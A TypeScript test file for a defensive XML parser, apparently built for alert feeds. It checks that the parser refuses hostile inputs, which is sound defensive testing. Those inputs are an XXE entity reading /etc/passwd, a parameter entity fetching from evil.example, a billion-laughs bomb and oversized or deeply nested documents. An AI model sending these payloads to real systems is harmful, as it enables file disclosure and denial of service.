import assert from 'node:assert/strict';
import { test } from 'node:test';
import { childText, decodeEntities, kid, kids, parseXml, textOf, XmlError } from './xml.ts';

test('elements, attributes, text, CDATA, prefixes and the predefined entities', () => {
  const root = parseXml(`<?xml version="1.0"?>
<!-- a comment -->
<feed xmlns="http://www.w3.org/2005/Atom" xmlns:cap="urn:oasis:names:tc:emergency:cap:1.2">
  <entry><title type="text">Wind &amp; rain &lt;yellow&gt; &#233;&#x4E2D;</title>
    <link rel='alternate' href="https://x.example/a?b=1&amp;c=2"/>
    <cap:event><![CDATA[<b>raw</b> & kept]]></cap:event>
  </entry>
</feed>`);
  assert.equal(root.name, 'feed');
  const entry = kid(root, 'entry')!;
  assert.equal(childText(entry, 'title'), 'Wind & rain <yellow> é中');
  assert.equal(kid(entry, 'title')!.attrs.type, 'text');
  assert.equal(kid(entry, 'link')!.attrs.href, 'https://x.example/a?b=1&c=2');
  const ev = kid(entry, 'event')!;
  assert.equal(ev.prefix, 'cap');
  assert.equal(textOf(ev), '<b>raw</b> & kept');
  assert.equal(kids(root).length, 1);
});

test('unknown named entities are left as they are, never expanded', () => {
  assert.equal(decodeEntities('a&nbsp;b &foo; &#0; &#xD800;'), 'a&nbsp;b &foo; � �');
  assert.equal(textOf(parseXml('<a>x&nbsp;y</a>')), 'x&nbsp;y');
});

test('a quoted > inside an attribute does not end the tag', () => {
  const r = parseXml('<a t="1 > 0"><b/></a>');
  assert.equal(r.attrs.t, '1 > 0');
  assert.equal(kids(r, 'b').length, 1);
});

test('XXE: an external entity reading a local file is refused, not resolved', () => {
  const xxe = `<?xml version="1.0"?>
<!DOCTYPE alert [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
<alert><identifier>&xxe;</identifier></alert>`;
  assert.throws(() => parseXml(xxe), XmlError);
  // Lower case, or a parameter entity without DOCTYPE, too.
  assert.throws(() => parseXml('<!doctype a><a/>'), XmlError);
  assert.throws(() => parseXml('<a><!ENTITY % p SYSTEM "http://evil.example/x"></a>'), XmlError);
});

test('billion laughs: refused at once, without expanding anything', () => {
  let ents = '<!ENTITY lol0 "lol">';
  for (let i = 1; i < 10; i++) ents += `<!ENTITY lol${i} "${`&lol${i - 1};`.repeat(10)}">`;
  const bomb = `<?xml version="1.0"?><!DOCTYPE lolz [${ents}]><lolz>&lol9;</lolz>`;
  const t0 = performance.now();
  assert.throws(() => parseXml(bomb), /DTD/);
  assert.ok(performance.now() - t0 < 50);
});

test('a 50 MB document is refused by its size, quickly', () => {
  const huge = `<a>${'x'.repeat(50 * 1024 * 1024)}</a>`;
  const t0 = performance.now();
  assert.throws(() => parseXml(huge), /too big/);
  assert.ok(performance.now() - t0 < 200);
});

test('10 000 levels of nesting are refused, without a stack overflow', () => {
  const deep = `${'<a>'.repeat(10_000)}${'</a>'.repeat(10_000)}`;
  assert.throws(() => parseXml(deep), /too deep/);
});

test('too many elements are refused', () => {
  assert.throws(() => parseXml(`<r>${'<i/>'.repeat(300)}</r>`, { maxElements: 100 }), /too many/);
});

test('malformed documents throw XmlError', () => {
  for (const bad of ['', 'text', '<a>', '<a></b>', '<a/><b/>', '<a><![CDATA[x</a>', '<a><!-- x</a>', '<1a/>', '</a>']) {
    assert.throws(() => parseXml(bad), XmlError, bad);
  }
});

test('a byte order mark is skipped', () => {
  assert.equal(parseXml('﻿<?xml version="1.0"?><rss/>').name, 'rss');
});
